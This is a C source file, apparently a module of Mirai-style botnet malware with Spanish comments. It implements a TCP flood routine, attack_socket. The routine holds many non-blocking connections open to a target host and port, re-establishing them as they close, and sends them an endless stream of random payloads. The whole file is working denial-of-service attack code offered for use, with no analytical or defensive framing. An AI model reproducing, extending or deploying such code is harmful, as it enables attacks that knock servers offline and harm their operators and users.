#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/limits.h>
#include <linux/if_ether.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/epoll.h>
#include <stdio.h>
#include <stdlib.h>   // para malloc, rand
#include <string.h>   // para memcpy

// Headers del proyecto (con ruta relativa)
#include "attack.h"
#include "includes.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

#define MAX_EPOLL_EVENTS 512
#define MAX_HTTP_SOCKETS 2000


void attack_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    uint16_t size = 0;
    uint16_t port = 0;

    //("TCP Bypass!\n");

    size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512); // Default size to 1 (random) if not specified
    port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff); // Default to 65535 if port not specified

    struct sockaddr_in addr;
    char *buf = (char *)malloc(size);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = targs[0].addr;

    memset(buf, 0, size);

    struct state
    {
        int fd;
        int state;
        uint32_t timeout;
    } states[MAX_FDS];

    int clear = 0;

    for(clear = 0; clear < MAX_FDS; clear++)
    {
        states[clear].fd = -1;
        states[clear].state = 0;
        states[clear].timeout = 0;
    }

    while(1)
    {
        int i = 0;
        fd_set write_set;
        struct timeval timeout;
        int fds = 0;
        socklen_t err = 0;
        int err_len = sizeof(int);

        for(i = 0; i < MAX_FDS; i++)
        {
            switch(states[i].state)
            {
                case 0:
                    if((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    {
                        continue;
                    }
                    NONBLOCK(states[i].fd);
                    errno = 0;
                    if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                    {
                        close(states[i].fd);
                        states[i].timeout = 0;
                        continue;
                    }
                    states[i].state = 1;
                    states[i].timeout = time(NULL);
                    break;
                case 1:
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);

                    timeout.tv_usec = 10;
                    timeout.tv_sec = 0;

                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                    if(fds == 1)
                    {
                        getsockopt(states[i].fd, SOL_SOCKET,SO_ERROR, &err, &err_len);

                        if(err)
                        {
                            close(states[i].fd);
                            states[i].state = 0;
                            states[i].timeout = 0;
                            continue;
                        }

                        states[i].state = 2;
                        continue;
                    }
                    else if(fds == -1)
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }

                    if(states[i].timeout + 5 < time(NULL))
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
                case 2:
                    if(size == 1)
                        size = 500 + rand() % 400; //random size between 500-900, randomizes with each packet
                    else
                        size = size;

                    rand_str((unsigned char*)buf, size);

                    if(send(states[i].fd, buf, size, MSG_NOSIGNAL) == -1 && errno != EAGAIN) // Finished send
                    {
                        close(states[i].fd);
                        states[i].state = 0;
                        states[i].timeout = 0;
                    }
                    break;
            }
        }
    }

    return;
}
